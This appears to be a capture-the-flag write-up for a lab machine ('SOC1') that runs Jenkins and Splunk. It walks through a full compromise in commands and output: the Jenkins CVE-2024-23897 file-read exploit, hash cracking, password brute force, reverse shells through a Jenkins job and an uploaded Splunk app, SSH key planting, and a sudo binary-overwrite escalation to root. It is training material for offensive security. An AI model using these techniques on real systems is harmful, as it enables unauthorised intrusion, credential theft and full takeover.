# SOC1

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.178:22
Open 10.0.2.178:80
Open 10.0.2.178:8000
Open 10.0.2.178:8080
Open 10.0.2.178:8089
Open 10.0.2.178:8191
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.178
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http     syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8000/tcp open  http     syn-ack Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.0.2.178:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
8080/tcp open  http     syn-ack Jetty 10.0.18
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
8089/tcp open  ssl/http syn-ack Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-13T11:00:50
| Not valid after:  2028-10-12T11:00:50
| MD5:   7079:316c:64d9:0db2:e32a:64db:3aab:7077
| SHA-1: c44a:e5a4:e166:8fea:a4e1:6fe1:6a4e:2f32:08ca:8c9f
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQDURrvGKz8qxzANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTEwMTMxMTAwNTBaFw0yODEwMTIxMTAw
| NTBaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwV8T
| hxh6GfG2EzVYu0tum5WwujvYNiDT/H3eYt+gdzrDN+dO/6Dp81G4NqdfCMZUPQLt
| CXueinUUySygtiV6LAJXF1vEtj3m0YZSs3HR7YCVpNyQQda7tfHVgi7f/zXFIgw5
| dh7ydgipFHvZd+ORxvVA53KwZkfwr+yV7cE0hGcyOBPE30pN1o34JiTnN1YrsJrZ
| QBfxIrHm10ubX4njhL4gUfLKjEq8fMxRVDNIq3rl5uNkckHT/sJvDbvML8xn1gYU
| SueCB9vU4v2ltOD+x0euDuP+KV7us2L+SIK/06BLuSA8ElvgwwtPlHcsLNIbECAw
| kHz30D8f9+z58ivxGQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDG+GGJ/8DBqLv3
| IQSfSqEvXxMpOEdWe2qJPhpKKRAl05Ckkr9CXPMBXuho2MgB1cKqgYKDmB/c0qKR
| v9mcqQJdbYa/4Wliir4d0NPjI3do4HgDudsvpYKDG4a0VQ+BXVxUpbiDd8F2XqwZ
| PXuI7bEdNBas77H2QLv7aSSe06EavN0BGcKrhNSxjQ11U+gGleUeghslSOFyoXod
| U7RYAdbODb21azL1no3afu5JZZzBuRChgr7g6d9DJ+shvik3F9US1QBLy9o/G9lx
| +7JWXsL/QBdhurUxsqOjPVs11SMMHyqH64LeU/2+SOcNNVadzRxbyrkXzZvUGMnd
| DRzuasdp
|_-----END CERTIFICATE-----
8191/tcp open  mongodb  syn-ack MongoDB 3.6 after 3.6.3, or 3.7.3 or later
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

```bash
â””â”€$ curl 'http://10.0.2.178' -i
HTTP/1.1 200 OK
Date: Mon, 05 Jan 2026 19:30:49 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 16
Content-Type: text/html; charset=UTF-8

Welcome to SOC!
```

```bash
â””â”€$ feroxbuster -u http://10.0.2.178 --thorough -C 404,400,414,500 -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET        1l        3w       16c http://10.0.2.178/index.php
```

Hmmm... might come back to this

## Jenkins (8080)

![writeup.png](/assets/pentest/hackmyvm/soc1/writeup.png)

### LFI

```bash
â””â”€$ searchsploit 'Jenkins 2.441'
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion    | java/webapps/51993.py
---------------------------------------- ---------------------------------
Shellcodes: No Results

â””â”€$ searchsploit -p java/webapps/51993.py
  Exploit: Jenkins 2.441 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/51993
     Path: /usr/share/exploitdb/exploits/java/webapps/51993.py
    Codes: CVE-2024-23897
 Verified: False
File Type: Python script, ASCII text executable
Copied EDB-ID #51993's path to the clipboard
```

```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /etc/passwd | grep sh$
jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash
splunk:x:1000:1000:,,,:/home/splunk:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

```xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <version>2.441</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>
  </authorizationStrategy>

  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>

  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <quietPeriod>5</quietPeriod>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>

  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>

  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
  <disabledAdministrativeMonitors/>

  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  
  <disableRememberMe>false</disableRememberMe>
</hudson>
```

No password ðŸ¤”
```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /var/lib/jenkins/secrets/initialAdminPassword
File not found.

â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /proc/self/environ | tr '\0' '\n'
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/home/jenkins
LOGNAME=jenkins
USER=jenkins
SHELL=/bin/bash
INVOCATION_ID=3a191c476822492f90a689ccef31839d
JOURNAL_STREAM=9:13262
JENKINS_HOME=/var/lib/jenkins

â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /proc/self/cmdline | tr '\0' ' '
/usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
```

```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /var/lib/jenkins/users/users.xml
<string>test_3253830066040356536</string>
```

```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /var/lib/jenkins/users/test_3253830066040356536/config.xml | grep passwordHash
<passwordHash>#jbcrypt:$2a$10$vKk.FDrPqNyv01Nx2QM6Gee0aq.7HUaCZIIGfODqdShRSQNmVSZCm</passwordHash>
```

```powershell
PS> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt 
test1234         (test)
```

> Creds: `test:test1234`

Login, create job, add `Execute shell`, reverse shell, Build, catch shell.

![writeup-1.png](/assets/pentest/hackmyvm/soc1/writeup-1.png)

```bash
â””â”€$ penelope -p 4444
jenkins@SOC:/var/lib/jenkins/workspace/hi$ id
uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins)
```

### Splunk

While I was waiting for hash to crack I was enumerating some files with LFI. We can try listing processes to maybe discover other services.

PID=325
```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /proc/self/stat
325 (java) S 1 325 325 0 -1 1077936384 77903 0 250 0 19947 589 0 0 20 0 41 0 825 2725224448 96075 18446744073709551615 94282339033088 94282339038173 140727885157248 0 0 0 0 0 16800975 0 0 0 17 0 0 0 6 0 0 94282339048736 94282339049496 94282341773312 140727885164215 140727885164275 140727885164275 140727885164522 0
```

Splunk is also running, but internally
```bash
300: /lib/systemd/systemd-timesyncd
320: splunkd --under-systemd --systemd-delegate=yes -p 8089 _internal_launch_under_systemd
323: /usr/sbin/cron -f
324: /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
327: /usr/sbin/rsyslogd -n -iNONE
330: /lib/systemd/systemd-logind
338: /usr/sbin/rsyslogd -n -iNONE
...
340: /usr/sbin/rsyslogd -n -iNONE
344: /sbin/agetty -o -p -- \u --noclear tty1 linux
369: /usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
370: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
388: /usr/sbin/apache2 -k start
393: /usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
...
402: /usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
411: /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
430: /usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
...
437: /usr/bin/java -jar /opt/jenkins/jenkins.war --httpPort=8080
453: /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
530: /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
```

```bash
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /proc/320/cgroup
0::/system.slice/Splunkd.service

â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /etc/systemd/system/Splunkd.service
...
ExecStart=/opt/splunk/bin/splunk _internal_launch_under_systemd
...
â””â”€$ py /usr/share/exploitdb/exploits/java/webapps/51993.py -u http://10.0.2.178:8080/ -p /opt/splunk/etc/passwd
Could not read file.
```

Can't read files in `/opt/splunk`

Anyway we have shell so let's inspect via shell.

## SSH

Upgrade shell
```bash
â””â”€$ gen_ssh_deploy id_rsa jenkins
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/jenkins/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe3amsy11K0FEWvGNjkJ4PBXaPFTEp3GEl8GjRFxMV8 woyag@kraken' >> /home/jenkins/.ssh/authorized_keys; chmod 700 /home/jenkins/.ssh; chmod 600 /home/jenkins/.ssh/authorized_keys
---
â””â”€$ ssh -i id_rsa jenkins@10.0.2.178
jenkins@SOC:~$ id
uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins)
```

## Lateral Movement

### Splunk

`passwd` is not readable, but `passwd.old` is and it has a custom note? Hint?! :gasp:
```bash
jenkins@SOC:/opt/splunk/etc$ cat passwd.old
Administrator passwords can be found under the seclists/Passwords folder.
grep -R 'splunk'
test:test1234
```

```bash
â””â”€$ grep 'splunk' /usr/share/seclists/Passwords -Rn | sort --field-separator=: --key=2n
/usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_passwords.txt:35946:hpsplunk
/usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt:43175:splunk,1
/usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt:43176:splunkadmin,changeme
/usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt:43177:splunk,splunk
/usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt:43178:splunk,splunk123
/usr/share/seclists/Passwords/Honeypot-Captures/multiplesources-passwords-fabian-fingerle.de.txt:90665:splunk
/usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_common-usernames-and-passwords.txt:459616:splunk
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt:784639:splunk
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt:1118386:thomasplunkett
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt:1240560:splunky
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt:1240561:splunko1
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt:1240562:splunk
/usr/share/seclists/Passwords/Software/bt4-password.txt:1250081:splunk
/usr/share/seclists/Passwords/darkc0de.txt:1260372:splunk
/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt:2677000:splunker
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt:3094358:travisplunk
/usr/share/seclists/Passwords/openwall.net-all.txt:3471979:splunk
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt:3586613:splunking
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt:3586614:splunket1
/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt:3942631:splunk
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt:5491008:misplunk1
```

```bash
â””â”€$ grep 'splunk' /usr/share/seclists/Passwords -Rn | awk -F':' '{print($3)}' | sort | uniq
â””â”€$ cat passwords.txt | tr ',' '\n' | sort | uniq > passwords2.txt
â””â”€$ cat passwords.txt passwords2.txt | sort | uniq > passwords3.txt
â””â”€$ hydra -l splunk -P passwords3.txt 10.0.2.178 ssh -I
# Nothing
```

```bash
â””â”€$ ffuf -u 'https://10.0.2.178:8089/services/auth/login' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=splunk&password=FUZZ' \
     -w passwords3.txt \
     -k
splunk123               [Status: 200, Size: 212, Words: 12, Lines: 7, Duration: 3643ms]
```

![writeup-2.png](/assets/pentest/hackmyvm/soc1/writeup-2.png)

- [Unraveling CVE-2023-46214: A Deep Dive into Splunk RCE Vulnerability](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214)
- [Analysis of CVE-2023-46214 + PoC](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [Splunk-RCE-poc](https://github.com/nathan31337/Splunk-RCE-poc)

![writeup-3.png](/assets/pentest/hackmyvm/soc1/writeup-3.png)

It's false!
```bash
jenkins@SOC:/opt/splunk$ grep 'enableSearchJobXslt' . -Rain 2>/dev/null
./etc/system/README/web.conf.spec:1308:enableSearchJobXslt = <boolean>
./etc/system/default/web.conf:497:enableSearchJobXslt = false
...
```

We can restart the service with sudo...
```bash
jenkins@SOC:/opt/splunk$ sudo -l
Matching Defaults entries for jenkins on SOC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jenkins may run the following commands on SOC:
    (ALL) NOPASSWD: /opt/splunk/bin/splunk search *
    (ALL) NOPASSWD: /opt/splunk/bin/splunk restart
```

Aha! Writable
```bash
jenkins@SOC:/opt/splunk$ ls -l ./etc/system/default/web.conf
-rw-rw-rw- 1 splunk splunk 58732 Oct 21 22:08 ./etc/system/default/web.conf
```

```bash
jenkins@SOC:/opt/splunk$ nano ./etc/system/default/web.conf
jenkins@SOC:/opt/splunk$ sudo /opt/splunk/bin/splunk restart
```

I was not able to make python POC script work so I did it manually

No matter what I did no scripts were written in `scripts` folder and hence execution failed.
```bash
jenkins@SOC:/opt/splunk/bin/scripts$ ls -Alh
total 4.0K
-r--r--r-- 1 splunk splunk 71 Jul 27  2022 readme.txt
```

Again after many tries I just uploaded an app
- [splunk_shells](https://github.com/TBGSecurity/splunk_shells) (AND OF CURSE IT DID NOT WORK)
- [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk) (WORDKED \o/)

```bash
â””â”€$ nano reverse_shell_splunk/bin/rev.py
â””â”€$ tar -cvzf letmein.tar.gz reverse_shell_splunk
â””â”€$ mv letmein.tar.gz letmein.tpl # Upload this
```

`penelope` failed by the way, stick to `rlwrap ncat -lvnp4445` and catch shell when uploading.
```bash
â””â”€$ listen 4445
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.0.2.179:47268.
splunk@SOC:/$ id
uid=1000(splunk) gid=1000(splunk) groups=1000(splunk)
```

Upgrade to SSH
```bash
splunk@SOC:/$ mkdir -p /home/splunk/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe3amsy11K0FEWvGNjkJ4PBXaPFTEp3GEl8GjRFxMV8 woyag@kraken' >> /home/splunk/.ssh/authorized_keys; chmod 700 /home/splunk/.ssh; chmod 600 /home/splunk/.ssh/authorized_keys
```

### User.txt

```bash
splunk@SOC:~$ cat user.txt
flag{69cd83075bb1066518625e09aac400711cd31ce7}
```

## Privilege Escalation

Privilege escalation to root is quite easy, since we are `splunk` we can overwrite `/opt/splunk/bin/splunk` binary
```bash
splunk@SOC:/opt/splunk/bin$ mv splunk splunk.bak
splunk@SOC:/opt/splunk/bin$ echo 'bash -p' > splunk
splunk@SOC:/opt/splunk/bin$ chmod +x splunk
```

And become root from jenkins!
```bash
jenkins@SOC:~$ sudo /opt/splunk/bin/splunk search 1
root@SOC:/home/jenkins# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@SOC:/home/jenkins# cat /root/root.txt
flag{418dd7b6ffb386eaeb520bc94aead264469c2e2f}
```